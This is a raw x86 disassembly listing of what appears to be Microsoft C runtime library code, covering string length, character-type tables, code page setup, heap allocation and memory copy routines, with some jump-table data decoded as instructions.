  423e74:	test   ecx,0x3
  423e7a:	je     0x423ea0
  423e7c:	mov    al,BYTE PTR [ecx]
  423e7e:	add    ecx,0x1
  423e81:	test   al,al
  423e83:	je     0x423ed3
  423e85:	test   ecx,0x3
  423e8b:	jne    0x423e7c
  423e8d:	add    eax,0x0
  423e92:	lea    esp,[esp+0x0]
  423e99:	lea    esp,[esp+0x0]
  423ea0:	mov    eax,DWORD PTR [ecx]
  423ea2:	mov    edx,0x7efefeff
  423ea7:	add    edx,eax
  423ea9:	xor    eax,0xffffffff
  423eac:	xor    eax,edx
  423eae:	add    ecx,0x4
  423eb1:	test   eax,0x81010100
  423eb6:	je     0x423ea0
  423eb8:	mov    eax,DWORD PTR [ecx-0x4]
  423ebb:	test   al,al
  423ebd:	je     0x423ef1
  423ebf:	test   ah,ah
  423ec1:	je     0x423ee7
  423ec3:	test   eax,0xff0000
  423ec8:	je     0x423edd
  423eca:	test   eax,0xff000000
  423ecf:	je     0x423ed3
  423ed1:	jmp    0x423ea0
  423ed3:	lea    eax,[ecx-0x1]
  423ed6:	mov    ecx,DWORD PTR [esp+0x4]
  423eda:	sub    eax,ecx
  423edc:	ret    
  423edd:	lea    eax,[ecx-0x2]
  423ee0:	mov    ecx,DWORD PTR [esp+0x4]
  423ee4:	sub    eax,ecx
  423ee6:	ret    
  423ee7:	lea    eax,[ecx-0x3]
  423eea:	mov    ecx,DWORD PTR [esp+0x4]
  423eee:	sub    eax,ecx
  423ef0:	ret    
  423ef1:	lea    eax,[ecx-0x4]
  423ef4:	mov    ecx,DWORD PTR [esp+0x4]
  423ef8:	sub    eax,ecx
  423efa:	ret    
  423efb:	push   0x8
  423efd:	push   0x428540
  423f02:	call   0x423858
  423f07:	and    DWORD PTR [ebp-0x4],0x0
  423f0b:	push   0x0
  423f0d:	push   0x1
  423f0f:	call   0x425a82
  423f14:	pop    ecx
  423f15:	pop    ecx
  423f16:	jmp    0x423f1f
  423f18:	xor    eax,eax
  423f1a:	inc    eax
  423f1b:	ret    
  423f1c:	mov    esp,DWORD PTR [ebp-0x18]
  423f1f:	or     DWORD PTR [ebp-0x4],0xffffffff
  423f23:	push   0x3
  423f25:	call   DWORD PTR ds:0x428028
  423f2b:	int3   
  423f2c:	cmp    ecx,DWORD PTR ds:0x45c430
  423f32:	jne    0x423f35
  423f34:	ret    
  423f35:	jmp    0x423efb
  423f3a:	movzx  eax,BYTE PTR [esp+0x4]
  423f3f:	mov    cl,BYTE PTR [esp+0xc]
  423f43:	test   BYTE PTR [eax+0x45cf21],cl
  423f49:	jne    0x423f67
  423f4b:	cmp    DWORD PTR [esp+0x8],0x0
  423f50:	je     0x423f60
  423f52:	movzx  eax,WORD PTR [eax*2+0x42893a]
  423f5a:	and    eax,DWORD PTR [esp+0x8]
  423f5e:	jmp    0x423f62
  423f60:	xor    eax,eax
  423f62:	test   eax,eax
  423f64:	jne    0x423f67
  423f66:	ret    
  423f67:	xor    eax,eax
  423f69:	inc    eax
  423f6a:	ret    
  423f6b:	push   0x4
  423f6d:	push   0x0
  423f6f:	push   DWORD PTR [esp+0xc]
  423f73:	call   0x423f3a
  423f78:	add    esp,0xc
  423f7b:	ret    
  423f7c:	sub    eax,0x3a4
  423f81:	je     0x423fa5
  423f83:	sub    eax,0x4
  423f86:	je     0x423f9f
  423f88:	sub    eax,0xd
  423f8b:	je     0x423f99
  423f8d:	dec    eax
  423f8e:	je     0x423f93
  423f90:	xor    eax,eax
  423f92:	ret    
  423f93:	mov    eax,0x404
  423f98:	ret    
  423f99:	mov    eax,0x412
  423f9e:	ret    
  423f9f:	mov    eax,0x804
  423fa4:	ret    
  423fa5:	mov    eax,0x411
  423faa:	ret    
  423fab:	push   edi
  423fac:	push   0x40
  423fae:	xor    eax,eax
  423fb0:	pop    ecx
  423fb1:	mov    edi,0x45cf20
  423fb6:	rep stos DWORD PTR es:[edi],eax
  423fb8:	stos   BYTE PTR es:[edi],al
  423fb9:	xor    eax,eax
  423fbb:	mov    ds:0x45d024,eax
  423fc0:	mov    ds:0x45cf1c,eax
  423fc5:	mov    ds:0x45cf14,eax
  423fca:	mov    edi,0x45d030
  423fcf:	stos   DWORD PTR es:[edi],eax
  423fd0:	stos   DWORD PTR es:[edi],eax
  423fd1:	stos   DWORD PTR es:[edi],eax
  423fd2:	pop    edi
  423fd3:	ret    
  423fd4:	push   ebp
  423fd5:	mov    ebp,esp
  423fd7:	sub    esp,0x518
  423fdd:	mov    eax,ds:0x45c430
  423fe2:	xor    eax,DWORD PTR [ebp+0x4]
  423fe5:	push   esi
  423fe6:	mov    DWORD PTR [ebp-0x4],eax
  423fe9:	lea    eax,[ebp-0x18]
  423fec:	push   eax
  423fed:	push   DWORD PTR ds:0x45d024
  423ff3:	call   DWORD PTR ds:0x4280a0
  423ff9:	cmp    eax,0x1
  423ffc:	mov    esi,0x100
  424001:	jne    0x424114
  424007:	xor    eax,eax
  424009:	mov    BYTE PTR [ebp+eax*1-0x118],al
  424010:	inc    eax
  424011:	cmp    eax,esi
  424013:	jb     0x424009
  424015:	mov    al,BYTE PTR [ebp-0x12]
  424018:	test   al,al
  42401a:	mov    BYTE PTR [ebp-0x118],0x20
  424021:	je     0x424059
  424023:	push   ebx
  424024:	lea    edx,[ebp-0x11]
  424027:	push   edi
  424028:	movzx  ecx,BYTE PTR [edx]
  42402b:	movzx  eax,al
  42402e:	cmp    eax,ecx
  424030:	ja     0x42404f
  424032:	sub    ecx,eax
  424034:	inc    ecx
  424035:	mov    ebx,ecx
  424037:	shr    ecx,0x2
  42403a:	lea    edi,[ebp+eax*1-0x118]
  424041:	mov    eax,0x20202020
  424046:	rep stos DWORD PTR es:[edi],eax
  424048:	mov    ecx,ebx
  42404a:	and    ecx,0x3
  42404d:	rep stos BYTE PTR es:[edi],al
  42404f:	inc    edx
  424050:	mov    al,BYTE PTR [edx]
  424052:	inc    edx
  424053:	test   al,al
  424055:	jne    0x424028
  424057:	pop    edi
  424058:	pop    ebx
  424059:	push   0x0
  42405b:	push   DWORD PTR ds:0x45cf14
  424061:	lea    eax,[ebp-0x518]
  424067:	push   DWORD PTR ds:0x45d024
  42406d:	push   eax
  42406e:	push   esi
  42406f:	lea    eax,[ebp-0x118]
  424075:	push   eax
  424076:	push   0x1
  424078:	call   0x425f88
  42407d:	push   0x0
  42407f:	push   DWORD PTR ds:0x45d024
  424085:	lea    eax,[ebp-0x218]
  42408b:	push   esi
  42408c:	push   eax
  42408d:	push   esi
  42408e:	lea    eax,[ebp-0x118]
  424094:	push   eax
  424095:	push   esi
  424096:	push   DWORD PTR ds:0x45cf14
  42409c:	call   0x425bcc
  4240a1:	push   0x0
  4240a3:	push   DWORD PTR ds:0x45d024
  4240a9:	lea    eax,[ebp-0x318]
  4240af:	push   esi
  4240b0:	push   eax
  4240b1:	push   esi
  4240b2:	lea    eax,[ebp-0x118]
  4240b8:	push   eax
  4240b9:	push   0x200
  4240be:	push   DWORD PTR ds:0x45cf14
  4240c4:	call   0x425bcc
  4240c9:	add    esp,0x5c
  4240cc:	xor    eax,eax
  4240ce:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  4240d6:	test   cl,0x1
  4240d9:	je     0x4240f1
  4240db:	or     BYTE PTR [eax+0x45cf21],0x10
  4240e2:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  4240e9:	mov    BYTE PTR [eax+0x45d040],cl
  4240ef:	jmp    0x42410d
  4240f1:	test   cl,0x2
  4240f4:	je     0x424106
  4240f6:	or     BYTE PTR [eax+0x45cf21],0x20
  4240fd:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  424104:	jmp    0x4240e9
  424106:	and    BYTE PTR [eax+0x45d040],0x0
  42410d:	inc    eax
  42410e:	cmp    eax,esi
  424110:	jb     0x4240ce
  424112:	jmp    0x424158
  424114:	xor    eax,eax
  424116:	cmp    eax,0x41
  424119:	jb     0x424134
  42411b:	cmp    eax,0x5a
  42411e:	ja     0x424134
  424120:	or     BYTE PTR [eax+0x45cf21],0x10
  424127:	mov    cl,al
  424129:	add    cl,0x20
  42412c:	mov    BYTE PTR [eax+0x45d040],cl
  424132:	jmp    0x424153
  424134:	cmp    eax,0x61
  424137:	jb     0x42414c
  424139:	cmp    eax,0x7a
  42413c:	ja     0x42414c
  42413e:	or     BYTE PTR [eax+0x45cf21],0x20
  424145:	mov    cl,al
  424147:	sub    cl,0x20
  42414a:	jmp    0x42412c
  42414c:	and    BYTE PTR [eax+0x45d040],0x0
  424153:	inc    eax
  424154:	cmp    eax,esi
  424156:	jb     0x424116
  424158:	mov    ecx,DWORD PTR [ebp-0x4]
  42415b:	xor    ecx,DWORD PTR [ebp+0x4]
  42415e:	pop    esi
  42415f:	call   0x423f2c
  424164:	leave  
  424165:	ret    
  424166:	push   ebp
  424167:	mov    ebp,esp
  424169:	sub    esp,0x1c
  42416c:	mov    eax,ds:0x45c430
  424171:	xor    eax,DWORD PTR [ebp+0x4]
  424174:	push   ebx
  424175:	push   esi
  424176:	mov    esi,DWORD PTR [ebp+0x8]
  424179:	xor    ebx,ebx
  42417b:	cmp    esi,ebx
  42417d:	mov    DWORD PTR [ebp-0x4],eax
  424180:	push   edi
  424181:	je     0x4242db
  424187:	xor    edx,edx
  424189:	xor    eax,eax
  42418b:	cmp    DWORD PTR [eax+0x45c440],esi
  424191:	je     0x4241f8
  424193:	add    eax,0x30
  424196:	inc    edx
  424197:	cmp    eax,0xf0
  42419c:	jb     0x42418b
  42419e:	lea    eax,[ebp-0x1c]
  4241a1:	push   eax
  4241a2:	push   esi
  4241a3:	call   DWORD PTR ds:0x4280a0
  4241a9:	cmp    eax,0x1
  4241ac:	jne    0x4242d3
  4241b2:	push   0x40
  4241b4:	xor    eax,eax
  4241b6:	cmp    DWORD PTR [ebp-0x1c],0x1
  4241ba:	pop    ecx
  4241bb:	mov    edi,0x45cf20
  4241c0:	rep stos DWORD PTR es:[edi],eax
  4241c2:	stos   BYTE PTR es:[edi],al
  4241c3:	mov    DWORD PTR ds:0x45d024,esi
  4241c9:	mov    DWORD PTR ds:0x45cf14,ebx
  4241cf:	jbe    0x4242c1
  4241d5:	cmp    BYTE PTR [ebp-0x16],0x0
  4241d9:	je     0x424299
  4241df:	lea    ecx,[ebp-0x15]
  4241e2:	mov    dl,BYTE PTR [ecx]
  4241e4:	test   dl,dl
  4241e6:	je     0x424299
  4241ec:	movzx  eax,BYTE PTR [ecx-0x1]
  4241f0:	movzx  edx,dl
  4241f3:	jmp    0x424289
  4241f8:	push   0x40
  4241fa:	xor    eax,eax
  4241fc:	pop    ecx
  4241fd:	mov    edi,0x45cf20
  424202:	rep stos DWORD PTR es:[edi],eax
  424204:	lea    ecx,[edx+edx*2]
  424207:	shl    ecx,0x4
  42420a:	mov    DWORD PTR [ebp-0x8],ebx
  42420d:	stos   BYTE PTR es:[edi],al
  42420e:	lea    ebx,[ecx+0x45c450]
  424214:	mov    al,BYTE PTR [ebx]
  424216:	mov    esi,ebx
  424218:	jmp    0x424243
  42421a:	mov    dl,BYTE PTR [esi+0x1]
  42421d:	test   dl,dl
  42421f:	je     0x424247
  424221:	movzx  eax,al
  424224:	movzx  edi,dl
  424227:	cmp    eax,edi
  424229:	ja     0x42423f
  42422b:	mov    edx,DWORD PTR [ebp-0x8]
  42422e:	mov    dl,BYTE PTR [edx+0x45c438]
  424234:	or     BYTE PTR [eax+0x45cf21],dl
  42423a:	inc    eax
  42423b:	cmp    eax,edi
  42423d:	jbe    0x424234
  42423f:	inc    esi
  424240:	inc    esi
  424241:	mov    al,BYTE PTR [esi]
  424243:	test   al,al
  424245:	jne    0x42421a
  424247:	inc    DWORD PTR [ebp-0x8]
  42424a:	add    ebx,0x8
  42424d:	cmp    DWORD PTR [ebp-0x8],0x4
  424251:	jb     0x424214
  424253:	mov    eax,DWORD PTR [ebp+0x8]
  424256:	mov    ds:0x45d024,eax
  42425b:	mov    DWORD PTR ds:0x45cf1c,0x1
  424265:	call   0x423f7c
  42426a:	lea    ecx,[ecx+0x45c444]
  424270:	mov    esi,ecx
  424272:	mov    edi,0x45d030
  424277:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424278:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424279:	mov    ds:0x45cf14,eax
  42427e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42427f:	jmp    0x4242e0
  424281:	or     BYTE PTR [eax+0x45cf21],0x4
  424288:	inc    eax
  424289:	cmp    eax,edx
  42428b:	jbe    0x424281
  42428d:	inc    ecx
  42428e:	inc    ecx
  42428f:	cmp    BYTE PTR [ecx-0x1],0x0
  424293:	jne    0x4241e2
  424299:	xor    ecx,ecx
  42429b:	inc    ecx
  42429c:	mov    eax,ecx
  42429e:	or     BYTE PTR [eax+0x45cf21],0x8
  4242a5:	inc    eax
  4242a6:	cmp    eax,0xff
  4242ab:	jb     0x42429e
  4242ad:	mov    eax,esi
  4242af:	call   0x423f7c
  4242b4:	mov    ds:0x45cf14,eax
  4242b9:	mov    DWORD PTR ds:0x45cf1c,ecx
  4242bf:	jmp    0x4242c7
  4242c1:	mov    DWORD PTR ds:0x45cf1c,ebx
  4242c7:	xor    eax,eax
  4242c9:	mov    edi,0x45d030
  4242ce:	stos   DWORD PTR es:[edi],eax
  4242cf:	stos   DWORD PTR es:[edi],eax
  4242d0:	stos   DWORD PTR es:[edi],eax
  4242d1:	jmp    0x4242e0
  4242d3:	cmp    DWORD PTR ds:0x45cd84,ebx
  4242d9:	je     0x4242e9
  4242db:	call   0x423fab
  4242e0:	call   0x423fd4
  4242e5:	xor    eax,eax
  4242e7:	jmp    0x4242ec
  4242e9:	or     eax,0xffffffff
  4242ec:	mov    ecx,DWORD PTR [ebp-0x4]
  4242ef:	xor    ecx,DWORD PTR [ebp+0x4]
  4242f2:	pop    edi
  4242f3:	pop    esi
  4242f4:	pop    ebx
  4242f5:	call   0x423f2c
  4242fa:	leave  
  4242fb:	ret    
  4242fc:	push   0x14
  4242fe:	push   0x428550
  424303:	call   0x423858
  424308:	or     DWORD PTR [ebp-0x1c],0xffffffff
  42430c:	push   0xd
  42430e:	call   0x423a1f
  424313:	pop    ecx
  424314:	xor    edi,edi
  424316:	mov    DWORD PTR [ebp-0x4],edi
  424319:	mov    DWORD PTR ds:0x45cd84,edi
  42431f:	mov    eax,DWORD PTR [ebp+0x8]
  424322:	cmp    eax,0xfffffffe
  424325:	jne    0x424339
  424327:	mov    DWORD PTR ds:0x45cd84,0x1
  424331:	call   DWORD PTR ds:0x42809c
  424337:	jmp    0x424364
  424339:	cmp    eax,0xfffffffd
  42433c:	jne    0x424350
  42433e:	mov    DWORD PTR ds:0x45cd84,0x1
  424348:	call   DWORD PTR ds:0x428098
  42434e:	jmp    0x424364
  424350:	cmp    eax,0xfffffffc
  424353:	jne    0x424364
  424355:	mov    DWORD PTR ds:0x45cd84,0x1
  42435f:	mov    eax,ds:0x45cdb4
  424364:	mov    DWORD PTR [ebp+0x8],eax
  424367:	cmp    eax,DWORD PTR ds:0x45d024
  42436d:	je     0x42442e
  424373:	mov    esi,DWORD PTR ds:0x45cf18
  424379:	mov    DWORD PTR [ebp-0x20],esi
  42437c:	cmp    esi,edi
  42437e:	je     0x424384
  424380:	cmp    DWORD PTR [esi],edi
  424382:	je     0x424394
  424384:	push   0x220
  424389:	call   0x424582
  42438e:	pop    ecx
  42438f:	mov    esi,eax
  424391:	mov    DWORD PTR [ebp-0x20],esi
  424394:	cmp    esi,edi
  424396:	je     0x424417
  424398:	push   DWORD PTR [ebp+0x8]
  42439b:	call   0x424166
  4243a0:	pop    ecx
  4243a1:	mov    DWORD PTR [ebp-0x1c],eax
  4243a4:	cmp    eax,edi
  4243a6:	jne    0x424417
  4243a8:	mov    DWORD PTR [esi],edi
  4243aa:	mov    eax,ds:0x45d024
  4243af:	mov    DWORD PTR [esi+0x4],eax
  4243b2:	mov    eax,ds:0x45cf1c
  4243b7:	mov    DWORD PTR [esi+0x8],eax
  4243ba:	mov    eax,ds:0x45cf14
  4243bf:	mov    DWORD PTR [esi+0xc],eax
  4243c2:	xor    eax,eax
  4243c4:	mov    DWORD PTR [ebp-0x24],eax
  4243c7:	cmp    eax,0x5
  4243ca:	jge    0x4243dc
  4243cc:	mov    cx,WORD PTR [eax*2+0x45d030]
  4243d4:	mov    WORD PTR [esi+eax*2+0x10],cx
  4243d9:	inc    eax
  4243da:	jmp    0x4243c4
  4243dc:	xor    eax,eax
  4243de:	mov    DWORD PTR [ebp-0x24],eax
  4243e1:	cmp    eax,0x101
  4243e6:	jge    0x4243f5
  4243e8:	mov    cl,BYTE PTR [eax+0x45cf20]
  4243ee:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  4243f2:	inc    eax
  4243f3:	jmp    0x4243de
  4243f5:	xor    eax,eax
  4243f7:	mov    DWORD PTR [ebp-0x24],eax
  4243fa:	cmp    eax,0x100
  4243ff:	jge    0x424411
  424401:	mov    cl,BYTE PTR [eax+0x45d040]
  424407:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  42440e:	inc    eax
  42440f:	jmp    0x4243f7
  424411:	mov    DWORD PTR ds:0x45cf18,esi
  424417:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  42441b:	jne    0x424431
  42441d:	cmp    esi,DWORD PTR ds:0x45cf18
  424423:	je     0x424431
  424425:	push   esi
  424426:	call   0x42446a
  42442b:	pop    ecx
  42442c:	jmp    0x424431
  42442e:	mov    DWORD PTR [ebp-0x1c],edi
  424431:	or     DWORD PTR [ebp-0x4],0xffffffff
  424435:	call   0x424443
  42443a:	mov    eax,DWORD PTR [ebp-0x1c]
  42443d:	call   0x423893
  424442:	ret    
  424443:	push   0xd
  424445:	call   0x42398b
  42444a:	pop    ecx
  42444b:	ret    
  42444c:	cmp    DWORD PTR ds:0x45d26c,0x0
  424453:	jne    0x424467
  424455:	push   0xfffffffd
  424457:	call   0x4242fc
  42445c:	pop    ecx
  42445d:	mov    DWORD PTR ds:0x45d26c,0x1
  424467:	xor    eax,eax
  424469:	ret    
  42446a:	push   0xc
  42446c:	push   0x428560
  424471:	call   0x423858
  424476:	mov    esi,DWORD PTR [ebp+0x8]
  424479:	test   esi,esi
  42447b:	je     0x4244d5
  42447d:	cmp    DWORD PTR ds:0x45d144,0x3
  424484:	jne    0x4244c6
  424486:	push   0x4
  424488:	call   0x423a1f
  42448d:	pop    ecx
  42448e:	and    DWORD PTR [ebp-0x4],0x0
  424492:	push   esi
  424493:	call   0x424c42
  424498:	pop    ecx
  424499:	mov    DWORD PTR [ebp-0x1c],eax
  42449c:	test   eax,eax
  42449e:	je     0x4244a9
  4244a0:	push   esi
  4244a1:	push   eax
  4244a2:	call   0x424c6d
  4244a7:	pop    ecx
  4244a8:	pop    ecx
  4244a9:	or     DWORD PTR [ebp-0x4],0xffffffff
  4244ad:	call   0x4244bd
  4244b2:	cmp    DWORD PTR [ebp-0x1c],0x0
  4244b6:	jne    0x4244d5
  4244b8:	push   DWORD PTR [ebp+0x8]
  4244bb:	jmp    0x4244c7
  4244bd:	push   0x4
  4244bf:	call   0x42398b
  4244c4:	pop    ecx
  4244c5:	ret    
  4244c6:	push   esi
  4244c7:	push   0x0
  4244c9:	push   DWORD PTR ds:0x45d140
  4244cf:	call   DWORD PTR ds:0x428088
  4244d5:	call   0x423893
  4244da:	ret    
  4244db:	push   0xc
  4244dd:	push   0x428570
  4244e2:	call   0x423858
  4244e7:	mov    esi,DWORD PTR [ebp+0x8]
  4244ea:	cmp    DWORD PTR ds:0x45d144,0x3
  4244f1:	jne    0x424521
  4244f3:	cmp    esi,DWORD PTR ds:0x45cf04
  4244f9:	ja     0x424521
  4244fb:	push   0x4
  4244fd:	call   0x423a1f
  424502:	pop    ecx
  424503:	and    DWORD PTR [ebp-0x4],0x0
  424507:	push   esi
  424508:	call   0x425421
  42450d:	pop    ecx
  42450e:	mov    DWORD PTR [ebp-0x1c],eax
  424511:	or     DWORD PTR [ebp-0x4],0xffffffff
  424515:	call   0x42454d
  42451a:	mov    eax,DWORD PTR [ebp-0x1c]
  42451d:	test   eax,eax
  42451f:	jne    0x424544
  424521:	test   esi,esi
  424523:	jne    0x424526
  424525:	inc    esi
  424526:	cmp    DWORD PTR ds:0x45d144,0x1
  42452d:	je     0x424535
  42452f:	add    esi,0xf
  424532:	and    esi,0xfffffff0
  424535:	push   esi
  424536:	push   0x0
  424538:	push   DWORD PTR ds:0x45d140
  42453e:	call   DWORD PTR ds:0x4280a4
  424544:	call   0x423893
  424549:	ret    
  42454a:	mov    esi,DWORD PTR [ebp+0x8]
  42454d:	push   0x4
  42454f:	call   0x42398b
  424554:	pop    ecx
  424555:	ret    
  424556:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  42455b:	ja     0x42457f
  42455d:	push   DWORD PTR [esp+0x4]
  424561:	call   0x4244db
  424566:	test   eax,eax
  424568:	pop    ecx
  424569:	jne    0x424581
  42456b:	cmp    DWORD PTR [esp+0x8],eax
  42456f:	je     0x424581
  424571:	push   DWORD PTR [esp+0x4]
  424575:	call   0x426142
  42457a:	test   eax,eax
  42457c:	pop    ecx
  42457d:	jne    0x42455d
  42457f:	xor    eax,eax
  424581:	ret    
  424582:	push   DWORD PTR ds:0x45cdc8
  424588:	push   DWORD PTR [esp+0x8]
  42458c:	call   0x424556
  424591:	pop    ecx
  424592:	pop    ecx
  424593:	ret    
  424594:	int3   
  424595:	int3   
  424596:	int3   
  424597:	int3   
  424598:	int3   
  424599:	int3   
  42459a:	int3   
  42459b:	int3   
  42459c:	int3   
  42459d:	int3   
  42459e:	int3   
  42459f:	int3   
  4245a0:	push   ebp
  4245a1:	mov    ebp,esp
  4245a3:	push   edi
  4245a4:	push   esi
  4245a5:	mov    esi,DWORD PTR [ebp+0xc]
  4245a8:	mov    ecx,DWORD PTR [ebp+0x10]
  4245ab:	mov    edi,DWORD PTR [ebp+0x8]
  4245ae:	mov    eax,ecx
  4245b0:	mov    edx,ecx
  4245b2:	add    eax,esi
  4245b4:	cmp    edi,esi
  4245b6:	jbe    0x4245c0
  4245b8:	cmp    edi,eax
  4245ba:	jb     0x42473c
  4245c0:	test   edi,0x3
  4245c6:	jne    0x4245dc
  4245c8:	shr    ecx,0x2
  4245cb:	and    edx,0x3
  4245ce:	cmp    ecx,0x8
  4245d1:	jb     0x4245fc
  4245d3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4245d5:	jmp    DWORD PTR [edx*4+0x4246ec]
  4245dc:	mov    eax,edi
  4245de:	mov    edx,0x3
  4245e3:	sub    ecx,0x4
  4245e6:	jb     0x4245f4
  4245e8:	and    eax,0x3
  4245eb:	add    ecx,eax
  4245ed:	jmp    DWORD PTR [eax*4+0x424600]
  4245f4:	jmp    DWORD PTR [ecx*4+0x4246fc]
  4245fb:	nop
  4245fc:	jmp    DWORD PTR [ecx*4+0x424680]
  424603:	nop
  424604:	adc    BYTE PTR [esi+0x42],al
  424607:	add    BYTE PTR [esi+eax*2],bh
  42460a:	inc    edx
  42460b:	add    BYTE PTR [eax+0x46],ah
  42460e:	inc    edx
  42460f:	add    BYTE PTR [ebx],ah
  424611:	ror    DWORD PTR [edx-0x75f877fa],1
  424617:	inc    esi
  424618:	add    DWORD PTR [eax+0x468a0147],ecx
  42461e:	add    al,cl
  424620:	jmp    0x289ce27
  424625:	add    esi,0x3
  424628:	add    edi,0x3
  42462b:	cmp    ecx,0x8
  42462e:	jb     0x4245fc
  424630:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424632:	jmp    DWORD PTR [edx*4+0x4246ec]
  424639:	lea    ecx,[ecx+0x0]
  42463c:	and    edx,ecx
  42463e:	mov    al,BYTE PTR [esi]
  424640:	mov    BYTE PTR [edi],al
  424642:	mov    al,BYTE PTR [esi+0x1]
  424645:	shr    ecx,0x2
  424648:	mov    BYTE PTR [edi+0x1],al
  42464b:	add    esi,0x2
  42464e:	add    edi,0x2
  424651:	cmp    ecx,0x8
  424654:	jb     0x4245fc
  424656:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424658:	jmp    DWORD PTR [edx*4+0x4246ec]
  42465f:	nop
  424660:	and    edx,ecx
  424662:	mov    al,BYTE PTR [esi]
  424664:	mov    BYTE PTR [edi],al
  424666:	add    esi,0x1
  424669:	shr    ecx,0x2
  42466c:	add    edi,0x1
  42466f:	cmp    ecx,0x8
  424672:	jb     0x4245fc
  424674:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424676:	jmp    DWORD PTR [edx*4+0x4246ec]
  42467d:	lea    ecx,[ecx+0x0]
  424680:	jecxz  0x4246c8
  424682:	inc    edx
  424683:	add    al,dl
  424685:	inc    esi
  424686:	inc    edx
  424687:	add    al,cl
  424689:	inc    esi
  42468a:	inc    edx
  42468b:	add    al,al
  42468d:	inc    esi
  42468e:	inc    edx
  42468f:	add    BYTE PTR [eax-0x4fffbdba],bh
  424695:	inc    esi
  424696:	inc    edx
  424697:	add    BYTE PTR [eax-0x5fffbdba],ch
  42469d:	inc    esi
  42469e:	inc    edx
  42469f:	add    BYTE PTR [ebx-0x761b71bc],cl
  4246a5:	inc    esp
  4246a6:	(bad)  
  4246a7:	in     al,0x8b
  4246a9:	inc    esp
  4246aa:	mov    gs,eax
  4246ac:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4246b0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4246b4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4246b8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4246bc:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4246c0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4246c4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4246c8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4246cc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4246d0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4246d4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4246d8:	lea    eax,[ecx*4+0x0]
  4246df:	add    esi,eax
  4246e1:	add    edi,eax
  4246e3:	jmp    DWORD PTR [edx*4+0x4246ec]
  4246ea:	mov    edi,edi
  4246ec:	cld    
  4246ed:	inc    esi
  4246ee:	inc    edx
  4246ef:	add    BYTE PTR [edi+eax*2],al
  4246f2:	inc    edx
  4246f3:	add    BYTE PTR [eax],dl
  4246f5:	inc    edi
  4246f6:	inc    edx
  4246f7:	add    BYTE PTR [edi+eax*2],ah
  4246fa:	inc    edx
  4246fb:	add    BYTE PTR [ebx+0x5f5e0845],cl
  424701:	leave  
  424702:	ret    
  424703:	nop
  424704:	mov    al,BYTE PTR [esi]
  424706:	mov    BYTE PTR [edi],al
  424708:	mov    eax,DWORD PTR [ebp+0x8]
  42470b:	pop    esi
  42470c:	pop    edi
  42470d:	leave  
  42470e:	ret    
  42470f:	nop
  424710:	mov    al,BYTE PTR [esi]
  424712:	mov    BYTE PTR [edi],al
  424714:	mov    al,BYTE PTR [esi+0x1]
  424717:	mov    BYTE PTR [edi+0x1],al
  42471a:	mov    eax,DWORD PTR [ebp+0x8]
  42471d:	pop    esi
  42471e:	pop    edi
  42471f:	leave  
  424720:	ret    
  424721:	lea    ecx,[ecx+0x0]
  424724:	mov    al,BYTE PTR [esi]
  424726:	mov    BYTE PTR [edi],al
  424728:	mov    al,BYTE PTR [esi+0x1]
  42472b:	mov    BYTE PTR [edi+0x1],al
  42472e:	mov    al,BYTE PTR [esi+0x2]
  424731:	mov    BYTE PTR [edi+0x2],al
  424734:	mov    eax,DWORD PTR [ebp+0x8]
  424737:	pop    esi
  424738:	pop    edi
  424739:	leave  
  42473a:	ret    
  42473b:	nop
  42473c:	lea    esi,[ecx+esi*1-0x4]
  424740:	lea    edi,[ecx+edi*1-0x4]
  424744:	test   edi,0x3
  42474a:	jne    0x424770
  42474c:	shr    ecx,0x2
  42474f:	and    edx,0x3
  424752:	cmp    ecx,0x8
  424755:	jb     0x424764
  424757:	std    
  424758:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42475a:	cld    
  42475b:	jmp    DWORD PTR [edx*4+0x424888]
  424762:	mov    edi,edi
  424764:	neg    ecx
  424766:	jmp    DWORD PTR [ecx*4+0x424838]
  42476d:	lea    ecx,[ecx+0x0]
  424770:	mov    eax,edi
  424772:	mov    edx,0x3
  424777:	cmp    ecx,0x4
  42477a:	jb     0x424788
  42477c:	and    eax,0x3
  42477f:	sub    ecx,eax
  424781:	jmp    DWORD PTR [eax*4+0x42478c]
  424788:	jmp    DWORD PTR [ecx*4+0x424888]
  42478f:	nop
  424790:	pushf  
  424791:	inc    edi
  424792:	inc    edx
  424793:	add    al,al
  424795:	inc    edi
  424796:	inc    edx
  424797:	add    al,ch
  424799:	inc    edi
  42479a:	inc    edx
  42479b:	add    BYTE PTR [edx-0x2edcfcba],cl
  4247a1:	mov    BYTE PTR [edi+0x3],al
  4247a4:	sub    esi,0x1
  4247a7:	shr    ecx,0x2
  4247aa:	sub    edi,0x1
  4247ad:	cmp    ecx,0x8
  4247b0:	jb     0x424764
  4247b2:	std    
  4247b3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4247b5:	cld    
  4247b6:	jmp    DWORD PTR [edx*4+0x424888]
  4247bd:	lea    ecx,[ecx+0x0]
  4247c0:	mov    al,BYTE PTR [esi+0x3]
  4247c3:	and    edx,ecx
  4247c5:	mov    BYTE PTR [edi+0x3],al
  4247c8:	mov    al,BYTE PTR [esi+0x2]
  4247cb:	shr    ecx,0x2
  4247ce:	mov    BYTE PTR [edi+0x2],al
  4247d1:	sub    esi,0x2
